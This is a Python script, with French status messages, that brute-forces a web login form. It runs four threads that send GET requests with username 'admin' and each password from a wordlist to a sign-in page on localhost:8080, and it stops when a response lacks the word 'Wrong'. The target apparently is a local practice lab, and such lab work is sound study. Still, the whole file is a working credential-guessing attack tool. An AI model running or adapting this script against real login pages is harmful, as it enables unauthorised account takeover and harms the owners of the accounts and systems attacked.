import requests
import time
import sys
from threading import Lock, Event
from concurrent.futures import ThreadPoolExecutor

ip = "localhost"
port = "8080"
url = f"http://{ip}:{port}/"
username = "admin"
password_file = "passwords.txt"
threads_count = 4 

session = requests.Session()
print_lock = Lock()
stop_event = Event()
found_password = None

def check_password(password, thread_idx):
    global found_password
    clean_pass = password.strip()
    if not clean_pass or stop_event.is_set():
        return

    with print_lock:
        if not stop_event.is_set():
            move_up = threads_count - thread_idx
            sys.stdout.write(f"\033[{move_up}A\033[2K\r[Thread {thread_idx}] Testing: {clean_pass}\033[{move_up}B\r")
            sys.stdout.flush()

    params = {
        'page': 'signin',
        'username': username,
        'password': clean_pass,
        'Login': 'Login'
    }
    
    try:
        response = session.get(url, params=params, timeout=5)

        if "Wrong" not in response.text:
            found_password = clean_pass
            stop_event.set()
    except:
        pass

def main():
    global found_password
    try:
        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f.readlines() if line.strip()]
    except:
        print("Fichier introuvable.")
        return

    print(f"[*] Brute Force en cours sur {len(passwords)} mots de passe...")
    for i in range(threads_count): print(f"[Thread {i}] En attente...")
    
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        for i, p in enumerate(passwords):
            if stop_event.is_set():
                break
            executor.submit(check_password, p, i % threads_count)

    if found_password:
        print(f"\n\n" + "="*40)
        print(f"  [!!!] SUCCÈS : {found_password}")
        print(f"  Temps : {time.time() - start_time:.2f}s")
        print("="*40)
    else:
        print("\n[X] Non trouvé.")

if __name__ == "__main__":
    sys.stdout.write("\033[?25l")
    try:
        main()
    finally:
        sys.stdout.write("\033[?25h")